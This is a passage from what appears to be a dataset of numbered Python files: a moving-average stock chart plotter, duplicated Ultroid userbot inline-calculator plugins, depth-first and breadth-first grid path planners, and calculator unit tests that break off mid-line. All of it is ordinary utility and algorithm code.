\u8fd9\u91cc\u7684\u5e38\u89c4\u7528\u9014\u662f\u4f20\u5165\u5356\u51faorder, with_points_ext=sell_index=pd.to_datetime(orders['sell_date']))\n    :param kwargs: \u7ed8\u5236\u6280\u672f\u6307\u6807\u9700\u8981\u7684\u5176\u5b83\u5173\u952e\u5b57\u53c2\u6570\uff0ctime_period\uff0cfrom_calc, with_price\uff0c\u6700\u7ec8\u900f\u4f20\u7ed9plot_ma\n    \"\"\"\n\n    # \u5982\u679c\u5916\u90e8\u4e0d\u8bbe\u7f6e\u5747\u7ebf\uff0c\u8fd9\u91ccpop\u7684default\u4e3a[30, 60, 90]\n    time_period = kwargs.pop('time_period', [30, 60, 90])\n    plot_ma(kl_pd.close, kl_pd.index, time_period, with_points=with_points,\n            with_points_ext=with_points_ext)\n\n\ndef plot_ma(prices, kl_index, time_period, from_calc=EMACalcType.E_MA_MA,\n            with_points=None, with_points_ext=None, with_price=True):\n    \"\"\"\n    \u4e00\u4e2a\u753b\u5e03\u4e0a\uff0c\u7ed8\u5236\u4ef7\u683c\u66f2\u7ebf\u4ee5\u53ca\u591a\u6761\u79fb\u52a8\u5e73\u5747\u7ebf\uff0c\u5982\u679c\u6709with_points\u70b9\u4f4d\u6807\u6ce8\uff0c\u4f7f\u7528\u7ad6\u7ebf\u6807\u6ce8\n    :param prices: \u6536\u76d8\u4ef7\u683c\u5e8f\u5217\uff0cpd.Series\u6216\u8005np.array\n    :param kl_index: pd.Index\u65f6\u95f4\u5e8f\u5217\n    :param time_period: \u6ce8\u610f\u662fIterable\u7c7b\u578b\uff0c\u9700\u8981\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff0c\u5373\u4f7f\u4e00\u4e2a\u5143\u7d20\u4e5f\u8981\u4f7f\u7528\u5982[10]\u5305\u88f9\n    :param from_calc: EMACalcType enum\u5bf9\u8c61\uff0c\u9ed8\u8ba4\u4f7f\u7528\u7b80\u5355\u79fb\u52a8\u5e73\u5747\u7ebf\n    :param with_points: \u8fd9\u91cc\u7684\u5e38\u89c4\u7528\u9014\u662f\u4f20\u5165\u4e70\u5165order, with_points=buy_index=pd.to_datetime(orders['buy_date']))\n    :param with_points_ext: \u8fd9\u91cc\u7684\u5e38\u89c4\u7528\u9014\u662f\u4f20\u5165\u5356\u51faorder, with_points_ext=sell_index=pd.to_datetime(orders['sell_date']))\n    :param with_price:  \u5c06\u4ef7\u683c\u4e00\u8d77\u7ed8\u5236\n    :return:\n    \"\"\"\n    # TODO Iterable\u548csix.string_types\u7684\u5224\u65ad\u62bd\u51fa\u6765\u653e\u5728\u4e00\u4e2a\u6a21\u5757\uff0c\u505a\u4e3aIterable\u7684\u5224\u65ad\u6765\u4f7f\u7528\n    if not isinstance(time_period, Iterable) or isinstance(time_period, six.string_types):\n        raise TypeError('MA CALC time_period MUST PASS Iterable!!!')\n\n    calc_type_func = calc_ma\n    # \u8fed\u4ee3\u8ba1\u7b97\u591a\u6761\u79fb\u52a8\u5747\u7ebf\uff0c\u4f7f\u7528from_calc\u4f7f\u7528\u7684\u65b9\u6cd5\u8ba1\u7b97\n    ma_array = [calc_type_func(prices, period, from_calc) for period in time_period]\n\n    plt.figure(figsize=[14, 7])\n\n    for ind, ma in enumerate(ma_array):\n        # ind\u7684\u4f5c\u7528\u662f\u7d22\u5f15\u5728\u539f\u59cbtime_period\u4e2d\u5bf9\u5e94label\u9700\u8981\u7684\u540d\u79f0\n        # noinspection PyUnresolvedReferences\n        plt.plot(kl_index, ma, label='ma {}'.format(time_period[ind]))\n\n    if with_price:\n        plt.plot(kl_index, prices, label='prices')\n\n    @catch_error(return_val=None, log=False)\n    def plot_with_point(points, co, cc):\n        \"\"\"\n        \u70b9\u4f4d\u4f7f\u7528\u5706\u70b9\uff0b\u7ad6\u7ebf\u8fdb\u884c\u6807\u6ce8\n        :param points: \u70b9\u4f4d\u5750\u6807\u5e8f\u5217\n        :param co: \u70b9\u989c\u8272 eg. 'go' 'ro'\n        :param cc: markeredgecolor\u548c\u7ad6\u7ebfaxvline\u989c\u8272 eg. 'green' 'red'\n        \"\"\"\n        v_index_num = kl_index.tolist().index(points)\n        # \u5982\u679c\u6709ma\u7ebf\uff0cy\u70b9\u505a\u76ee\u6807\u753b\u5728\u7b2c\u4e00\u6839ma\u7ebf\u4e0a\u5426\u5219\u753b\u5728\u4ef7\u683c\u4e0a\u9762\n        y_array = ma_array[0] if len(ma_array) > 0 else prices\n        plt.plot(points, y_array[v_index_num], co, markersize=12, markeredgewidth=3.0,\n                 markerfacecolor='None', markeredgecolor=cc)\n        plt.axvline(points, color=cc)\n\n    # with_points\u548cwith_points_ext\u7684\u70b9\u4f4d\u4f7f\u7528\u7ad6\u7ebf\u6807\u6ce8\n    if with_points is not None:\n        # plt.axvline(with_points, color='green', linestyle='--')\n        plot_with_point(with_points, 'go', 'green')\n\n    if with_points_ext is not None:\n        # plt.axvline(with_points_ext, color='red')\n        plot_with_point(with_points_ext, 'ro', 'red')\n\n    plt.grid(True)\n    plt.legend(loc='best')\n    plt.show()\n", "324": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "325": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "326": "\"\"\"\n\nDepth-First grid planning\n\nauthor: Erwin Lejeune (@spida_rwin)\n\nSee Wikipedia article (https://en.wikipedia.org/wiki/Depth-first_search)\n\n\"\"\"\n\nimport math\n\nimport matplotlib.pyplot as plt\n\nshow_animation = True\n\n\nclass DepthFirstSearchPlanner:\n\n    def __init__(self, ox, oy, reso, rr):\n        \"\"\"\n        Initialize grid map for Depth-First planning\n\n        ox: x position list of Obstacles [m]\n        oy: y position list of Obstacles [m]\n        resolution: grid resolution [m]\n        rr: robot radius[m]\n        \"\"\"\n\n        self.reso = reso\n        self.rr = rr\n        self.calc_obstacle_map(ox, oy)\n        self.motion = self.get_motion_model()\n\n    class Node:\n        def __init__(self, x, y, cost, parent_index, parent):\n            self.x = x  # index of grid\n            self.y = y  # index of grid\n            self.cost = cost\n            self.parent_index = parent_index\n            self.parent = parent\n\n        def __str__(self):\n            return str(self.x) + \",\" + str(self.y) + \",\" + str(\n                self.cost) + \",\" + str(self.parent_index)\n\n    def planning(self, sx, sy, gx, gy):\n        \"\"\"\n        Depth First search\n\n        input:\n            s_x: start x position [m]\n            s_y: start y position [m]\n            gx: goal x position [m]\n            gy: goal y position [m]\n\n        output:\n            rx: x position list of the final path\n            ry: y position list of the final path\n        \"\"\"\n\n        nstart = self.Node(self.calc_xyindex(sx, self.minx),\n                           self.calc_xyindex(sy, self.miny), 0.0, -1, None)\n        ngoal = self.Node(self.calc_xyindex(gx, self.minx),\n                          self.calc_xyindex(gy, self.miny), 0.0, -1, None)\n\n        open_set, closed_set = dict(), dict()\n        open_set[self.calc_grid_index(nstart)] = nstart\n\n        while 1:\n            if len(open_set) == 0:\n                print(\"Open set is empty..\")\n                break\n\n            current = open_set.pop(list(open_set.keys())[-1])\n            c_id = self.calc_grid_index(current)\n\n            # show graph\n            if show_animation:  # pragma: no cover\n                plt.plot(self.calc_grid_position(current.x, self.minx),\n                         self.calc_grid_position(current.y, self.miny), \"xc\")\n                # for stopping simulation with the esc key.\n                plt.gcf().canvas.mpl_connect('key_release_event',\n                                             lambda event:\n                                             [exit(0) if event.key == 'escape'\n                                              else None])\n                plt.pause(0.01)\n\n            if current.x == ngoal.x and current.y == ngoal.y:\n                print(\"Find goal\")\n                ngoal.parent_index = current.parent_index\n                ngoal.cost = current.cost\n                break\n\n            # expand_grid search grid based on motion model\n            for i, _ in enumerate(self.motion):\n                node = self.Node(current.x + self.motion[i][0],\n                                 current.y + self.motion[i][1],\n                                 current.cost + self.motion[i][2], c_id, None)\n                n_id = self.calc_grid_index(node)\n\n                # If the node is not safe, do nothing\n                if not self.verify_node(node):\n                    continue\n\n                if n_id not in closed_set:\n                    open_set[n_id] = node\n                    closed_set[n_id] = node\n                    node.parent = current\n\n        rx, ry = self.calc_final_path(ngoal, closed_set)\n        return rx, ry\n\n    def calc_final_path(self, ngoal, closedset):\n        # generate final course\n        rx, ry = [self.calc_grid_position(ngoal.x, self.minx)], [\n            self.calc_grid_position(ngoal.y, self.miny)]\n        n = closedset[ngoal.parent_index]\n        while n is not None:\n            rx.append(self.calc_grid_position(n.x, self.minx))\n            ry.append(self.calc_grid_position(n.y, self.miny))\n            n = n.parent\n\n        return rx, ry\n\n    def calc_grid_position(self, index, minp):\n        \"\"\"\n        calc grid position\n\n        :param index:\n        :param minp:\n        :return:\n        \"\"\"\n        pos = index * self.reso + minp\n        return pos\n\n    def calc_xyindex(self, position, min_pos):\n        return round((position - min_pos) / self.reso)\n\n    def calc_grid_index(self, node):\n        return (node.y - self.miny) * self.xwidth + (node.x - self.minx)\n\n    def verify_node(self, node):\n        px = self.calc_grid_position(node.x, self.minx)\n        py = self.calc_grid_position(node.y, self.miny)\n\n        if px < self.minx:\n            return False\n        elif py < self.miny:\n            return False\n        elif px >= self.maxx:\n            return False\n        elif py >= self.maxy:\n            return False\n\n        # collision check\n        if self.obmap[node.x][node.y]:\n            return False\n\n        return True\n\n    def calc_obstacle_map(self, ox, oy):\n\n        self.minx = round(min(ox))\n        self.miny = round(min(oy))\n        self.maxx = round(max(ox))\n        self.maxy = round(max(oy))\n        print(\"min_x:\", self.minx)\n        print(\"min_y:\", self.miny)\n        print(\"max_x:\", self.maxx)\n        print(\"max_y:\", self.maxy)\n\n        self.xwidth = round((self.maxx - self.minx) / self.reso)\n        self.ywidth = round((self.maxy - self.miny) / self.reso)\n        print(\"x_width:\", self.xwidth)\n        print(\"y_width:\", self.ywidth)\n\n        # obstacle map generation\n        self.obmap = [[False for _ in range(self.ywidth)]\n                      for _ in range(self.xwidth)]\n        for ix in range(self.xwidth):\n            x = self.calc_grid_position(ix, self.minx)\n            for iy in range(self.ywidth):\n                y = self.calc_grid_position(iy, self.miny)\n                for iox, ioy in zip(ox, oy):\n                    d = math.hypot(iox - x, ioy - y)\n                    if d <= self.rr:\n                        self.obmap[ix][iy] = True\n                        break\n\n    @staticmethod\n    def get_motion_model():\n        # dx, dy, cost\n        motion = [[1, 0, 1],\n                  [0, 1, 1],\n                  [-1, 0, 1],\n                  [0, -1, 1],\n                  [-1, -1, math.sqrt(2)],\n                  [-1, 1, math.sqrt(2)],\n                  [1, -1, math.sqrt(2)],\n                  [1, 1, math.sqrt(2)]]\n\n        return motion\n\n\ndef main():\n    print(__file__ + \" start!!\")\n\n    # start and goal position\n    sx = 10.0  # [m]\n    sy = 10.0  # [m]\n    gx = 50.0  # [m]\n    gy = 50.0  # [m]\n    grid_size = 2.0  # [m]\n    robot_radius = 1.0  # [m]\n\n    # set obstacle positions\n    ox, oy = [], []\n    for i in range(-10, 60):\n        ox.append(i)\n        oy.append(-10.0)\n    for i in range(-10, 60):\n        ox.append(60.0)\n        oy.append(i)\n    for i in range(-10, 61):\n        ox.append(i)\n        oy.append(60.0)\n    for i in range(-10, 61):\n        ox.append(-10.0)\n        oy.append(i)\n    for i in range(-10, 40):\n        ox.append(20.0)\n        oy.append(i)\n    for i in range(0, 40):\n        ox.append(40.0)\n        oy.append(60.0 - i)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(ox, oy, \".k\")\n        plt.plot(sx, sy, \"og\")\n        plt.plot(gx, gy, \"xb\")\n        plt.grid(True)\n        plt.axis(\"equal\")\n\n    dfs = DepthFirstSearchPlanner(ox, oy, grid_size, robot_radius)\n    rx, ry = dfs.planning(sx, sy, gx, gy)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(rx, ry, \"-r\")\n        plt.pause(0.01)\n        plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "327": "\"\"\"\n\nBreadth-First grid planning\n\nauthor: Erwin Lejeune (@spida_rwin)\n\nSee Wikipedia article (https://en.wikipedia.org/wiki/Breadth-first_search)\n\n\"\"\"\n\nimport math\n\nimport matplotlib.pyplot as plt\n\nshow_animation = True\n\n\nclass BreadthFirstSearchPlanner:\n\n    def __init__(self, ox, oy, reso, rr):\n        \"\"\"\n        Initialize grid map for bfs planning\n\n        ox: x position list of Obstacles [m]\n        oy: y position list of Obstacles [m]\n        resolution: grid resolution [m]\n        rr: robot radius[m]\n        \"\"\"\n\n        self.reso = reso\n        self.rr = rr\n        self.calc_obstacle_map(ox, oy)\n        self.motion = self.get_motion_model()\n\n    class Node:\n        def __init__(self, x, y, cost, parent_index, parent):\n            self.x = x  # index of grid\n            self.y = y  # index of grid\n            self.cost = cost\n            self.parent_index = parent_index\n            self.parent = parent\n\n        def __str__(self):\n            return str(self.x) + \",\" + str(self.y) + \",\" + str(\n                self.cost) + \",\" + str(self.parent_index)\n\n    def planning(self, sx, sy, gx, gy):\n        \"\"\"\n        Breadth First search based planning\n\n        input:\n            s_x: start x position [m]\n            s_y: start y position [m]\n            gx: goal x position [m]\n            gy: goal y position [m]\n\n        output:\n            rx: x position list of the final path\n            ry: y position list of the final path\n        \"\"\"\n\n        nstart = self.Node(self.calc_xyindex(sx, self.minx),\n                           self.calc_xyindex(sy, self.miny), 0.0, -1, None)\n        ngoal = self.Node(self.calc_xyindex(gx, self.minx),\n                          self.calc_xyindex(gy, self.miny), 0.0, -1, None)\n\n        open_set, closed_set = dict(), dict()\n        open_set[self.calc_grid_index(nstart)] = nstart\n\n        while 1:\n            if len(open_set) == 0:\n                print(\"Open set is empty..\")\n                break\n\n            current = open_set.pop(list(open_set.keys())[0])\n\n            c_id = self.calc_grid_index(current)\n\n            closed_set[c_id] = current\n\n            # show graph\n            if show_animation:  # pragma: no cover\n                plt.plot(self.calc_grid_position(current.x, self.minx),\n                         self.calc_grid_position(current.y, self.miny), \"xc\")\n                # for stopping simulation with the esc key.\n                plt.gcf().canvas.mpl_connect('key_release_event',\n                                             lambda event:\n                                             [exit(0) if event.key == 'escape'\n                                              else None])\n                if len(closed_set.keys()) % 10 == 0:\n                    plt.pause(0.001)\n\n            if current.x == ngoal.x and current.y == ngoal.y:\n                print(\"Find goal\")\n                ngoal.parent_index = current.parent_index\n                ngoal.cost = current.cost\n                break\n\n            # expand_grid search grid based on motion model\n            for i, _ in enumerate(self.motion):\n                node = self.Node(current.x + self.motion[i][0],\n                                 current.y + self.motion[i][1],\n                                 current.cost + self.motion[i][2], c_id, None)\n                n_id = self.calc_grid_index(node)\n\n                # If the node is not safe, do nothing\n                if not self.verify_node(node):\n                    continue\n\n                if (n_id not in closed_set) and (n_id not in open_set):\n                    node.parent = current\n                    open_set[n_id] = node\n\n        rx, ry = self.calc_final_path(ngoal, closed_set)\n        return rx, ry\n\n    def calc_final_path(self, ngoal, closedset):\n        # generate final course\n        rx, ry = [self.calc_grid_position(ngoal.x, self.minx)], [\n            self.calc_grid_position(ngoal.y, self.miny)]\n        n = closedset[ngoal.parent_index]\n        while n is not None:\n            rx.append(self.calc_grid_position(n.x, self.minx))\n            ry.append(self.calc_grid_position(n.y, self.miny))\n            n = n.parent\n\n        return rx, ry\n\n    def calc_grid_position(self, index, minp):\n        \"\"\"\n        calc grid position\n\n        :param index:\n        :param minp:\n        :return:\n        \"\"\"\n        pos = index * self.reso + minp\n        return pos\n\n    def calc_xyindex(self, position, min_pos):\n        return round((position - min_pos) / self.reso)\n\n    def calc_grid_index(self, node):\n        return (node.y - self.miny) * self.xwidth + (node.x - self.minx)\n\n    def verify_node(self, node):\n        px = self.calc_grid_position(node.x, self.minx)\n        py = self.calc_grid_position(node.y, self.miny)\n\n        if px < self.minx:\n            return False\n        elif py < self.miny:\n            return False\n        elif px >= self.maxx:\n            return False\n        elif py >= self.maxy:\n            return False\n\n        # collision check\n        if self.obmap[node.x][node.y]:\n            return False\n\n        return True\n\n    def calc_obstacle_map(self, ox, oy):\n\n        self.minx = round(min(ox))\n        self.miny = round(min(oy))\n        self.maxx = round(max(ox))\n        self.maxy = round(max(oy))\n        print(\"min_x:\", self.minx)\n        print(\"min_y:\", self.miny)\n        print(\"max_x:\", self.maxx)\n        print(\"max_y:\", self.maxy)\n\n        self.xwidth = round((self.maxx - self.minx) / self.reso)\n        self.ywidth = round((self.maxy - self.miny) / self.reso)\n        print(\"x_width:\", self.xwidth)\n        print(\"y_width:\", self.ywidth)\n\n        # obstacle map generation\n        self.obmap = [[False for _ in range(self.ywidth)]\n                      for _ in range(self.xwidth)]\n        for ix in range(self.xwidth):\n            x = self.calc_grid_position(ix, self.minx)\n            for iy in range(self.ywidth):\n                y = self.calc_grid_position(iy, self.miny)\n                for iox, ioy in zip(ox, oy):\n                    d = math.hypot(iox - x, ioy - y)\n                    if d <= self.rr:\n                        self.obmap[ix][iy] = True\n                        break\n\n    @staticmethod\n    def get_motion_model():\n        # dx, dy, cost\n        motion = [[1, 0, 1],\n                  [0, 1, 1],\n                  [-1, 0, 1],\n                  [0, -1, 1],\n                  [-1, -1, math.sqrt(2)],\n                  [-1, 1, math.sqrt(2)],\n                  [1, -1, math.sqrt(2)],\n                  [1, 1, math.sqrt(2)]]\n\n        return motion\n\n\ndef main():\n    print(__file__ + \" start!!\")\n\n    # start and goal position\n    sx = 10.0  # [m]\n    sy = 10.0  # [m]\n    gx = 50.0  # [m]\n    gy = 50.0  # [m]\n    grid_size = 2.0  # [m]\n    robot_radius = 1.0  # [m]\n\n    # set obstacle positions\n    ox, oy = [], []\n    for i in range(-10, 60):\n        ox.append(i)\n        oy.append(-10.0)\n    for i in range(-10, 60):\n        ox.append(60.0)\n        oy.append(i)\n    for i in range(-10, 61):\n        ox.append(i)\n        oy.append(60.0)\n    for i in range(-10, 61):\n        ox.append(-10.0)\n        oy.append(i)\n    for i in range(-10, 40):\n        ox.append(20.0)\n        oy.append(i)\n    for i in range(0, 40):\n        ox.append(40.0)\n        oy.append(60.0 - i)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(ox, oy, \".k\")\n        plt.plot(sx, sy, \"og\")\n        plt.plot(gx, gy, \"xb\")\n        plt.grid(True)\n        plt.axis(\"equal\")\n\n    bfs = BreadthFirstSearchPlanner(ox, oy, grid_size, robot_radius)\n    rx, ry = bfs.planning(sx, sy, gx, gy)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(rx, ry, \"-r\")\n        plt.pause(0.01)\n        plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "328": "\"\"\"\nTests for calculator\nMade by Sandro Skhirtladze\n\"\"\"\nimport calc\n\n\ndef test_permitted_operators():\n    \"\"\"\n    test for permitted operators\n    \"\"\"\n    assert calc.permitted_operators() == ['+', '-', '*', '/']\n\n\ndef test_permitted_symbols():\n    \"\"\"\n    test for permitted symbols\n    \"\"\"\n    assert calc.permitted_symbols() == ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']\n\n\ndef test_is_operator():\n    \"\"\"\n    test for operator checker\n    \"\"\"\n    assert calc.is_operator('+')\n    assert calc.is_operator('-')\n    assert calc.is_operator('*')\n    assert calc.is_operator('/')\n    assert not calc.is_operator('9')\n    assert not calc.is_operator('&')\n    assert not calc.is_operator('(')\n    assert not calc.is_operator(')')\n    assert not calc.is_operator('a')\n    assert not calc.is_operator('//')\n    assert not calc.is_operator('95')\n    assert not calc.is_operator('&^()')\n\n\ndef test_is_symbol_permitted_equation():\n    \"\"\"\n    test for permitted symbol checker\n    \"\"\"\n    assert calc.is_symbol_permitted_equation('+')\n    assert calc.is_symbol_permitted_equation('-')\n    assert calc.is_symbol_permitted_equation('*')\n    assert calc.is_symbol_permitted_equation('/')\n    assert calc.is_symbol_permitted_equation('9')\n    assert calc.is_symbol_permitted_equation('95')\n    assert calc.is_symbol_permitted_equation('9+5')\n    assert not calc.is_symbol_permitted_equation('%')\n    assert not calc.is_symbol_permitted_equation('&')\n    assert not calc.is_symbol_permitted_equation('(')\n    assert not calc.is_symbol_permitted_equation(')')\n    assert not calc.is_symbol_permitted_equation('a')\n    assert not calc.is_symbol_permitted_equation('9a')\n    assert calc.is_symbol_permitted_equation('//')\n    assert calc.is_symbol_permitted_equation('9//5')\n    assert not calc.is_symbol_permitted_equation('9&5')\n    assert not calc.is_symbol_permitted_equation('&^()')\n\n\ndef test_has_edge_operator():\n    \"\"\"\n    test for unwanted characters at the edges\n    \"\"\"\n    assert calc.has_edge_operator(\"+9\")\n    assert calc.has_edge_operator(\"9+\")\n    assert calc.has_edge_operator(\"+9+\")\n    assert calc.has_edge_operator(\"+9+6\")\n    assert calc.has_edge_operator(\"8+9+\")\n    assert not calc.has_edge_operator(\"8+9+25\")\n\n\ndef test_is_correct_sequence():\n    \"\"\"\n    test for sequence checker\n    \"\"\"\n    assert calc.is_correct_sequence(\"8+9+25\")\n    assert calc.is_correct_sequence(\"8+9-25/99*5\")\n    assert not calc.is_correct_sequence(\"8+9++25\")\n    assert not calc.is_correct_sequence(\"8+9+-25\")\n    assert not calc.is_correct_sequence(\"8+9/-25\")\n\n\ndef test_calculate():\n    \"\"\"\n    tests for calculator\n    \"\"\"\n    assert calc.calculate(\"\") == \"( Error: Please Enter the Equation in Correct Format )\"\n    assert calc.calculate(\"10+5\") == str(15)\n    assert calc.calculate(\"10-5\") == str(5)\n    assert calc.calculate(\"10*3\") == str(30)\n    assert calc.calculate(\"10/5\") == str(2)\n    assert calc.calculate(\"10/3\") == str(3)\n    assert calc.calculate(\"9/10\") == str(1)\n    assert calc.calculate(\"10/4\") == str(3)\n    assert calc.calculate(\"10/0\") == \"(Error: divide by 0)\"\n    assert calc.calculate(\"10.4+3.5\") == \"( Error: Equation Contains Unpermitted Symbol )\"\n    assert calc.calculate(\"abcd+efg\") == \"( Error: Equation Contains Unpermitted Symbol )\"\n    assert calc.calculate(\"a10+3b\") == \"( Error: Equation Contains Unpermitted Symbol )\"\n    assert calc.calculate(\"10++3\") == \"( Error: Please Enter the Equation in Correct Format )\"\n    assert calc.calculate(\"-10+5\") == \"( Error: Please Enter the Equation in Correct Format )\"\n    assert calc.calculate(\"1+5+1\") == str(7)\n    assert calc.calculate(\"1+5+1-2\") == str(5)\n    assert calc.calculate(\"3+10/3+13/3\") == str(11)\n    assert calc.calculate(\"10/2*3\") == str(2)\n    assert calc.calculate(\"10/2*3+3\") == str(5)\n    assert calc.calculate(\"10/2*3+-3\") == \"( Error: Please Enter the Equation in Correct Format )\"\n    assert calc.calculate(\"10/(2*3+3)\") == \"( Error: Equation Contains Unpermitted Symbol )\"\n\n    # my tests:\n    assert calc.calculate(\"+10\") == \"( Error: Please Enter the Equation in Correct Format )\"\n    assert calc.calculate(\"10\") == str(10)\n    assert calc.calculate(\"10-\") == \"( Error: Please Enter the Equation in Correct Format )\"\n    assert 